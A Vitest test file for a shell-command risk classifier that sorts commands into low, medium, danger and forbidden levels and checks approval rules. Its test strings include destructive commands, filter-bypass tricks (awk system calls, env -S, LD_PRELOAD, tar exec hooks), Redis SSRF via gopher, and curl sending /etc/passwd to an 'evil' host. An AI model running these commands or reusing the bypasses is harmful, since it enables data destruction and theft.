import { describe, it, expect } from 'vitest'
import policy from './commandPolicy.js'

const { classifyCommand, needsApproval } = policy
const level = (command) => classifyCommand(command).level

describe('classifyCommand: low', () => {
  it.each([
    'ls -al', 'cd /var/log', 'pwd', 'cat /var/log/app.log', 'tail -n 200 app.log',
    'grep -i error app.log | tail -n 20', 'ps aux | grep java', 'df -h', 'free -m', 'du -sh /var/log',
    'systemctl status tomcat', 'journalctl -u nginx --since today', 'docker ps -a', 'docker logs --tail 100 web',
    'kubectl get pods -n prod', 'git log --oneline -5', 'git branch -a', 'tar -tzf backup.tar.gz', 'crontab -l',
    'find /var/log -name "*.log" -mtime -1', 'top -b -n 1', 'ls 2>&1', 'ls > /dev/null', 'grep "a;b" file',
    '/usr/bin/ls -al', 'echo hello', 'LANG=C ls', 'ip addr', 'timeout 5 tail -n 10 x', 'nohup ls', 'xargs'
  ])('%s', (command) => {
    expect(level(command)).toBe('low')
  })
})

describe('classifyCommand: medium', () => {
  it.each([
    'cat .env', 'cat /app/config/application-prod.yml', 'grep password ~/.ssh/config', 'env', 'printenv',
    'find / -name x', 'grep -r foo /', 'du -sh /', 'tail -f app.log', 'journalctl -f', 'docker logs -f web',
    'curl http://localhost:8080/health', "awk '{print $1}' access.log", 'sed -n 1,10p app.log', 'top',
    'watch df -h', 'kubectl config view', 'docker stats'
  ])('%s', (command) => {
    expect(level(command)).toBe('medium')
  })
})

describe('classifyCommand: danger', () => {
  it.each([
    'rm app.log', 'rm -rf /tmp/build', 'mv a b', 'cp a b', 'chmod 755 x', 'kill 1234', 'systemctl restart tomcat',
    'service nginx reload', 'docker restart web', 'docker exec -it web bash', 'kubectl delete pod x', 'sudo ls', 'su -',
    'apt install vim', 'pip install x', 'bash -c "ls"', 'sh script.sh', 'python3 x.py', './deploy.sh', 'ssh other',
    'scp a b:', 'mysql -u root', 'redis-cli FLUSHALL', 'vi app.conf', 'sed -i s/a/b/ f', 'echo x > file',
    'echo x >> file', 'cat a | tee b', 'ls &', 'find . -name "*.tmp" -delete', 'find . -exec rm {} \\;',
    'tar -xzf a.tar.gz', 'git pull', 'git checkout -- .', 'crontab -e', 'curl -o x http://a', 'curl -X POST http://a',
    'wget http://a', 'pm2 restart all', 'supervisorctl stop app', 'ls; rm x', 'ls && rm x', 'ls || rm x',
    'ls | xargs rm', 'echo $(rm x)', 'echo `rm x`', '/bin/rm x', '\\rm x', "r''m x", 'FOO=1 rm x', 'env rm x',
    'nice -n 10 rm x', 'timeout 5 rm x', 'unknowncmd', 'echo "unterminated', `awk 'BEGIN{system("rm x")}'`,
    'ls\nrm x', '(rm x)', 'diff <(rm x) y', 'cat <<EOF\nhi\nEOF'
  ])('%s', (command) => {
    expect(level(command)).toBe('danger')
  })
})

describe('classifyCommand: forbidden', () => {
  it.each([
    'rm -rf /', 'rm -rf /*', 'sudo rm -rf /', 'rm -fr ~', 'rm -rf $HOME', 'rm -r --no-preserve-root /x',
    'mkfs.ext4 /dev/sdb1', 'dd if=/dev/zero of=/dev/sda', 'echo x > /dev/sda', 'shutdown -h now', 'reboot',
    'sudo reboot', 'systemctl reboot', 'init 0', ':(){ :|:& };:', 'chmod -R 777 /', 'chown -R nobody /',
    'ls; rm -rf /'
  ])('%s', (command) => {
    expect(level(command)).toBe('forbidden')
  })
})

describe('classifyCommand: reasons', () => {
  it('names the command and why', () => {
    expect(classifyCommand('rm x').reasons).toContain('rm: 파일 삭제')
  })

  it('marks unknown commands', () => {
    expect(classifyCommand('pm3 restart').reasons).toContain('pm3: 처음 보는 명령')
  })

  it('lists the highest risk first', () => {
    const { reasons } = classifyCommand('cat .env; rm x')
    expect(reasons[0]).toBe('rm: 파일 삭제')
  })

  it('has no reasons for plain reads', () => {
    expect(classifyCommand('ls -al').reasons).toEqual([])
  })

  it('treats empty input as dangerous', () => {
    expect(level('   ')).toBe('danger')
  })
})

describe('needsApproval', () => {
  it.each([
    ['low', 'danger', false], ['medium', 'danger', false], ['danger', 'danger', true],
    ['low', 'medium', false], ['medium', 'medium', true], ['danger', 'medium', true],
    ['low', 'all', true], ['medium', 'all', true], ['danger', 'all', true],
    ['forbidden', 'all', false], ['forbidden', 'danger', false], ['low', 'bogus', true]
  ])('needsApproval(%s, %s) = %s', (riskLevel, alertLevel, expected) => {
    expect(needsApproval(riskLevel, alertLevel)).toBe(expected)
  })
})

describe('fix round 1: regression (danger)', () => {
  it.each([
    `watch ls ';rm -f x'`, `watch echo '$(rm -f x)'`, `watch -n 1 ls '&&' rm x`, `env -S 'rm -f x'`, `env -S'rm -f x'`,
    `env --split-string='rm -f x'`,
    `systemctl -o cat stop nginx`, `systemctl -p status restart nginx`, `systemctl -P status stop nginx`,
    `docker -l info rm -f web`, `docker --log-level info run --rm -v /:/h alpine rm -rf /h/x`,
    `docker compose -p logs down`, `docker-compose -p ps down -v`, `kubectl -n get delete pod x`,
    `git --namespace log push origin --force`, `git -C log reset --hard`, `git -c core.pager=x log`,
    `sort -o /etc/hosts a`, `uniq a /etc/hosts`, `tree -o out`, `xxd a out`, `yq -i '.a=1' f.yml`, `file -C -m m`,
    `sort --compress-program=/tmp/x.sh -S 1 big`, `rg --pre /tmp/x.sh foo .`, `less -o log f`,
    `date -s '2020-01-01'`, `date 010100002020`, `hostname evil`, `hostnamectl set-hostname evil`,
    `timedatectl set-time 2020-01-01`, `timedatectl set-timezone UTC`, `dmesg -C`, `dmesg --clear`,
    `ss -K dst 10.0.0.1`, `lastlog -C -u root`,
    `tar -tf a.tar --checkpoint=1 --checkpoint-action=exec='rm -f x'`, `tar -tf a.tar -I 'rm -f x'`,
    `tar -tf a.tar --use-compress-program=/tmp/x.sh`,
    `ip netns exec ns rm -f x`, `ip vrf exec v rm x`, `ip -b cmds.txt`, `ip -batch cmds.txt`, `ip r d default`,
    `ip l s eth0 down`, `ip a a 1.2.3.4/24 dev eth0`,
    `git log --output=/etc/hosts`, `git diff --output=x`, `git grep -O'rm -f' foo`,
    `git grep --open-files-in-pager=/tmp/x.sh foo`, `git branch --set-upstream-to=origin/main`,
    `git branch --unset-upstream`, `git branch --edit-description`,
    `LD_PRELOAD=/tmp/x.so ls`, `env LD_PRELOAD=/tmp/x.so ls`, `PATH=/tmp/x:$PATH; ls`,
    `GIT_EXTERNAL_DIFF=/tmp/x.sh git diff`,
    `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='rm -f x' git status`,
    `time -o /etc/hosts ls`, `/usr/bin/time -o out ls`, `command time -o x ls`, `ionice -c 3 -p 1`,
    `awk -v a=1 'BEGIN{system("rm -f x")}'`, `awk -F : 'BEGIN{system("rm -f x")}'`,
    `awk 'BEGIN{print "rm -f x" | "sh"}'`, `awk -f prog.awk f`,
    `curl -sX DELETE http://localhost/a`, `curl --data-ascii x http://a`, `curl -c /etc/hosts http://a`,
    `curl -D out http://a`, `curl --trace out http://a`, `curl -K cfg http://a`,
    `curl gopher://127.0.0.1:6379/_FLUSHALL`, `curl dict://127.0.0.1:6379/flushall`,
    `sed 'e rm -f x' f`, `sed -n '1e rm -f x' f`, `sed -n 'w /etc/hosts' f`, `sed 's/a/b/e' f`,
    `sed 's/a/b/w out' f`, `sed -f script.sed f`,
    `/tmp/x/ls`, `bin/ls`, `~/bin/cat x`, `journalctl --setup-keys`, `journalctl --cursor-file=/etc/x`
  ])('%s', (command) => {
    expect(level(command)).toBe('danger')
  })

  it('forbids writing to sysrq-trigger', () => {
    expect(level('echo b > /proc/sysrq-trigger')).toBe('forbidden')
  })
})

describe('fix round 1: regression (low)', () => {
  it.each([
    'kubectl -n prod get pods', 'docker compose -f a.yml logs', 'git -C /srv/app log', 'LANG=C ls', 'TZ=UTC date',
    'date +%F', 'hostname', '/usr/bin/ls -al', '/bin/cat x', 'ip -br addr', 'ip route show', 'ip a', 'git branch -a',
    'git branch --merged main', 'tar -tvzf a.tgz', 'tar --list --file=a.tar', 'timedatectl status', 'hostnamectl',
    'ps aux', 'ps -ef', 'systemctl --no-pager status nginx'
  ])('%s', (command) => {
    expect(level(command)).toBe('low')
  })
})

describe('fix round 1: regression (medium)', () => {
  it.each([
    'cat ~/.kube/config', 'cat /proc/1/environ', 'ps eww', `sed -n '1,10p' f`, `sed 's/a/b/g' f`,
    `awk '{print $1}' f`, `awk -F: '{print $1}' f`
  ])('%s', (command) => {
    expect(level(command)).toBe('medium')
  })
})

describe('fix round 1: needsApproval fails closed', () => {
  it('requires approval for an unknown level', () => {
    expect(needsApproval('bogus', 'danger')).toBe(true)
  })
})

describe('fix round 2: regression (danger)', () => {
  it.each([
    `env --sp='rm -f x'`, `env --split='rm -f x'`, `env -a ls rm -f x`, `env --argv0 ls rm -f x`,
    `git grep -iO'rm -f x' foo`, `git grep --open='rm -f x' foo`, `gawk --source='BEGIN{system("rm -f x")}' f`,
    `awk -e '{print}' -e 'BEGIN{system("rm -f x")}' f`, `awk '@include "/tmp/x.awk"' f`,
    `gawk 'BEGIN{f="system"; @f("rm -f x")}'`, `sed -n --expr='w /etc/hosts' 1p f`, `sed --fi=s.sed 1p f`,
    `sed --in-pl 's/a/b/' f`, `/usr/bin/time --o=/etc/hosts ls`, `command time --outp=x ls`, `sort --o=/etc/hosts a`,
    `sort --compress-p=/tmp/x.sh -S 1 big`, `date --se='2020-01-01'`, `date --s=2020-01-01`, `dmesg --cle`,
    `ss --ki dst 1.2.3.4`, `lastlog --cl -u root`, `lastlog --se -u root`, `hostname --fi=/etc/x`, `file --comp -m m`,
    `less --log-fi=out f`, `journalctl --setup`, `journalctl --rot`, `journalctl --smart-relinquish-var`,
    `journalctl --update-catalog`, `ss -D /etc/hosts`, `tree -R -L 1 -H .`, `yq -s '.a' f.yml`, `uniq - /etc/hosts`,
    `xxd -r - /etc/hosts`, `git stash list --output=/etc/hosts`, `git stash show --output=/etc/hosts`,
    `git stash show --ext-diff`, `curl --url=gopher://127.0.0.1:6379/_FLUSHALL`,
    `curl --proto-default gopher 127.0.0.1:6379/_FLUSHALL`, `curl --stderr /etc/hosts http://a`,
    `curl --etag-save /etc/hosts http://a`, `curl --hsts /tmp/h http://a`, `curl -w '%output{/etc/hosts}x' http://a`,
    `curl --expand-output /etc/hosts http://a`, `curl --expand-data x http://a`, `curl --form-string a=b http://a`,
    `curl -X POST https://a`, `tar -tf host:/x`
  ])('%s', (command) => {
    expect(level(command)).toBe('danger')
  })
})

describe('fix round 2: regression (medium)', () => {
  it.each([
    'ps ax ewww', 'kubectl get pods -w', 'dmesg -w', 'curl -sS -L https://a', `curl -H 'Accept: x' https://a`,
    'curl -sX GET https://a', `awk -F: '{print $1}' f`
  ])('%s', (command) => {
    expect(level(command)).toBe('medium')
  })
})

describe('fix round 2: regression (low)', () => {
  it.each([
    'date --date yesterday +%F', `date -d '1 day ago' +%F`, 'git grep -n foo', 'git grep -in -e foo', 'git stash list',
    'journalctl -u nginx --since today -n 100 --no-pager', 'journalctl -b', 'sort -r a', 'uniq a'
  ])('%s', (command) => {
    expect(level(command)).toBe('low')
  })
})

describe('fix round 3: regression', () => {
  it.each([
    'curl -X GET -X DELETE https://a/x', 'curl -XGET -XPOST https://a/x', 'curl --request GET --request PUT https://a/x',
    'curl -I -X GET -X PATCH https://a',
    'gawk \'BEGIN{system\\\n("rm -f x")}\'', 'awk \'BEGIN{"rm -f x" |\\\ngetline v}\'',
    'uniq -- -x /etc/hosts', 'uniq -- -in -out', 'xxd -- -x /etc/hosts', 'xxd -r -- -a -b',
    'curl -H @/etc/passwd https://evil', 'curl --header=@/etc/passwd https://evil', 'curl -H@/etc/passwd https://evil',
    `less '+!id' f`, `more '+!id' f`
  ])('danger: %s', (command) => {
    expect(level(command)).toBe('danger')
  })

  it.each([
    'kubectl get pods -Aw', 'kubectl get pods -wA', 'kubectl logs -pf mypod', 'kubectl logs -fp mypod'
  ])('medium: %s', (command) => {
    expect(level(command)).toBe('medium')
  })

  it.each(['less +G f', 'curl -H "Accept: x" https://a', 'kubectl get pods -o wide'])('stays low/medium: %s', (command) => {
    expect(['low', 'medium']).toContain(level(command))
  })
})

describe('final fix M2: awk line continuation with CRLF', () => {
  it.each([
    // backslash, CR, LF inside the awk program
    `gawk 'BEGIN{system${'\\'}\r\n("rm -f x")}'`, `awk 'BEGIN{"rm -f x" |${'\\'}\r\ngetline v}'`
  ])('danger: %j', (command) => {
    expect(level(command)).toBe('danger')
  })
})
